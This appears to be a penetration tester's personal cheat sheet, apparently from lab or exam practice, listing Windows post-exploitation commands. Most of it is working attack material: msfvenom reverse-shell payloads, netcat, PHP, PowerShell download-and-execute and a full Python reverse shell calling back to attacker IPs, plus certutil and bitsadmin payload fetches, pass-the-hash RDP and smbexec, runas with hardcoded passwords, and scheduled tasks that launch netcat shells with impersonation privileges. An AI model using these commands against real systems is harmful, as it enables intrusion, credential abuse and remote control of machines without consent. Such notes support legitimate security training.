
### transfer files

##### scp

on the kali
```
sudo service ssh start
```

on the remote
```
from kali to target:
scp pinklii@<ip>:<s_path> <d_path>

from target to kali:
scp <s_path> pinklii@192.168.45.238:<d_path>
```

then on the kali
```
sudo service ssh stop
```

##### wget

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

on target:
```
wget -f http://<ip>:<port>/<file_path>
```

##### curl

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

```
curl http://<ip>:<port>/<file_path> -o <d_path>
```


##### FTP / TFTP

start ftp server and upload/download files

##### metasploit

create meterpreter shell and use upload and download modules
create payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f exe -o met.exe
```

in msfconsole use  multi/handler
```
use multi/handler
```

configuration
```
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.208
set LPORT 443
```

as marcus download met.exe from the python server we create and execute it
```
iwr -uri http://192.168.45.208:8000/met.exe -Outfile met.exe
```


##### certutil

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

```
certutil -urlcache -split -f http://<ip>:<port>/<s_file> <d_file>
certutil.exe -urlcache -split -f http://<ip>:<port>/<s_file> <d_file>
```


##### bitsadmin

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

on target:
```
bitsadmin /create MyDownload

bitsadmin /addfile MyDownload http://<ip>:<port>/<s_path> <d_path>

bitsadmin /resume MyDownload

bitsadmin /info MyDownload /verbose

bitsadmin /complete MyDownload
```

##### powershell

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ip>:<port>/<s_path>', '<d_path>')
```

```
Invoke-WebRequest -URI http://<ip>:<port>/<s_path> -OutFile <d_path>
```



##### SMB

on kali
```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

on windows:
```
net use m: \\Kali_IP\test /user:kourosh kourosh 
copy mimikatz.log m:\
```

from windows to kali:
https://blog.ropnop.com/transferring-files-from-kali-to-windows/#setting-up-the-server
download files from kali to target
```
copy \\192.168.45.160\TEST\winpeas.exe
```
##### evil-winrm

after create a shell using evil-winrm using built in moduls

```
upload <s_path> <d_path>
```

```
download <s_path> <d_path>
```

### compile

on my kali (ARM) for arch x86_64 windows machine
```
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

### revers shell

msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f exe -o sys.exe

msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.177 LPORT=242 -e x86/shikata_ga_nai -f exe -o shell.exe
```

nc
```
nc.exe 192.168.45.160 4444 -e powershell
```

php
```
php -r '$sock=fsockopen("192.168.45.160",4444);system("powershell <&3 >&3 2>&3");'
```

powershell
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178:21/powercat.ps1');powercat -c 192.168.45.178 -p 445 -e powershell"
```

python
```
import os,socket,subprocess,threading;
def s2p(s, p):

    while True:
        data = s.recv(1024)
        if len(data) > 0:

            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:

        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.4",9001))

p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE,
stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()

except KeyboardInterrupt:
    s.close()
```

### run as different user - powershell

powershell
```
# 1
$username = "username"
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $password)

Start-Process "exe to run" -Credential $credential

# 2
$password = ConvertTo-SecureString "i6yuT6tym@" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("damon", $password)
Enter-PSSession -ComputerName LEGACY -Credential $cred

# 3
$pass = ConvertTo-SecureString 'ThisPasswordShouldDo!@' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator",
$pass)
Invoke-Command -Computer localhost -ScriptBlock {COMMAND TO RUN} -Credential $cred
```

add to remote desktop users group
```
Add-ADGroupMember -Identity "Remote Desktop Users" -Members damon

net localgroup 'Remote Desktop Users' damon /add
```

cmd
```
runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443" 
```

using the tool: https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9--------------------------------
```
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"
```

### tunnel

##### ligolo

on kali
config route
```
sudo ip tuntap add user pinklii mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.91.0/24 dev ligolo

# local porf fowarding
sudo ip route add 240.0.0.1/32 dev ligolo

# see that it added
ip rout list                                                               
```

start ligolo
```
./proxy -selfcert
```

on target
download
```
iwr -uri http://192.168.45.171:8000/agent.exe -Outfile agent.exe
```
start ligolo
```
.\agent.exe -connect 192.168.45.171:11601 -ignore-cert
```

listeners:

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```

testing: 
```
crackmapexec smb 10.10.164.0/24 
```

##### chisel


### RDP

```
xfreerdp /v:<ip> /u:<user> /d:. /pth:<hash>

xfreerdp /v:<ip> /u:<user>
```

### search file

powershell
```
Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Filter "local.txt"
```

cmd
```
dir C:\local.txt /s
```

### schedule task

```
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

Start-ScheduledTask -TaskName "GrantPerm"
```

creating a `ScheduledTaskPrincipal` where we can specify `SeImpersonatePrivilege` in `RequiredPrivilege` attribute.

```
# Create a list of privileges
PS C:\Windows\system32> [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"

# Create a Principal for the task 
PS C:\Windows\system32> $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

# Create an action for the task 
PS C:\Windows\system32> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

# Create the task
PS C:\Windows\system32> Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              GrantAllPerms                     Ready     

# Start the task
PS C:\Windows\system32> Start-ScheduledTask -TaskName "GrantAllPerms"
```

or you can you the tool https://github.com/itm4n/FullPowers

### shells

```
impacket-smbexec <domain>/<username>@<target_ip> -hashes <LM_Hash>:<NT_Hash>
```

### PATH

add to path
```
set PATH=%PATH%;C:\Windows\System32
```